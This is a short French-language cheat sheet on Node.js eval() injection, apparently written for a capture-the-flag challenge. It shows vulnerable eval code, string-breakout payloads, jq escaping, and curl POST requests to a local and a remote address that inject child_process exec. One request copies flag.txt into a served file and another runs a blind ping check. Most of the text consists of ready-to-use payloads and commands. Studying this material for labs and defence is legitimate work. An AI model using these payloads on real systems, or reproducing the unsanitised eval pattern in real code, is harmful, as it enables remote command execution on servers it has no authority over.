# Injection NodeJS

tester avec: ";", "+", and ".".
 
## basics:

### code 

```javascript
 eval("var i = '" + input + "'")
```
### injection:

```javascript
 '; console.log('injection'); '
```
### execurtera: 

```javascript
 var i = ''; console.log('injection'); ''
```

## +complexe:

### Code:

```javascript
eval('const crypto = require("crypto"); keyHash = crypto.createHash("md5").update("' + json[key] + '").digest("hex");');
```

### échapper les chars:

```bash
└──╼ $jq -aR .
"); console.log("successful injection"); //
"\"); console.log(\"successful injection\"); //"
```

```bash
└──╼ $curl -X POST http://127.0.0.1:21440/admin -d '{"key":"\"); console.log(\"successful injection\"); //"}'
successful injection
const crypto = require("crypto"); keyHash = crypto.createHash("md5").update(""); console.log("successful injection"); //").digest("hex")

curl -X POST http://167.99.88.216:32153/admin -d '{"key":"\"); const { exec } = require(\"child_process\"); exec(\"cat flag.txt > denied.html\"); //"}'
```

### Blind:

```bash
curl http://127.0.0.1:21440/admin -X POST -d '{"key":"\"); const { exec } = require(\"child_process\"); exec(\"ping -c 3 127.0.0.1\"); //"}'
sudo tcpdump -i lo icmp
```